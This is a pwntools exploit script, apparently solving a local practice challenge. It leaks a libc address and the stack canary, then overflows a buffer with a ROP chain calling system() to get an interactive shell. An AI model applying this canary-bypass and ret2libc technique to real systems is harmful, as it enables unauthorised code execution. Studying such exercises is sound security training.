from pwn import *

elf = ELF("./reto8")
libc = elf.libc

context.terminal = ["x-terminal-emulator", "-e"]
context.binary = elf

# WIN = 0x0000000000401216
# WIN = elf.symbols.win
RET = ROP(elf).ret.address #0x40122f

p = elf.process()
attach(p, "continue")

p.sendlineafter(b"length", b"104")
p.sendlineafter(b"bytes", "aaa")
p.recvuntil(b"was:\n")
leak = p.recvuntil("Introduce", drop=True)

# for i in range(0, len(leak) - 1, 8):
# 	value = u64(leak[i:i+8])
# 	print(hex(value))
libc_leak = u64(leak[72:72+8])
libc_base = libc_leak - 0x29D90
libc.address = libc_base
print(hex(libc_base))

rop = ROP(libc)
rop.system(libc_base + 0x1d8678)

# print(hexdump(leak))

canary = leak[0x28:0x30]
print(hexdump(canary))

payload = b""
payload = flat([
	b"A"*40,
	canary,
	b"A"*8,
	RET,
	rop,
])
p.sendlineafter(b"length", str(len(payload)).encode())
p.sendlineafter(b"bytes", payload)

p.interactive()